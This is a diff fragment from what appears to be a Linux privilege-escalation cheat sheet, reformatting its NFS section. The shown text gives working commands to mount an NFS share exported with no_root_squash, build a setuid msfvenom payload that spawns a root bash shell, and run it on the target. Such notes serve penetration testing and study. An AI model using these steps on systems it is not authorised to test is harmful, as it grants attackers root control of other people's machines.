@@ -113,14 +113,15 @@ View contents of the system-wide crontab with:
 
 ### NFS
 Have a look in the file /etc/exports and look for any directories with no_root_squash attribute. If there is a dir with this then files in it can be run as root so long as the files uploaded are done so by a root user.
-Commands as follows:
 
-  # LOCAL LINUX MACHINE:
+LOCAL LINUX MACHINE:
   mkdir /tmp/nfs
   mount -o rw,vers=2 [IP]:[DIR] /tmp/nfs
   msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
   chmod +xs /tmp/nfs/shell.elf
-  # TARGET LINUX MACHINE:
+  
+ TARGET LINUX MACHINE:
+ 
   [DIR]/shell.elf
 
 ### Kernel exploits
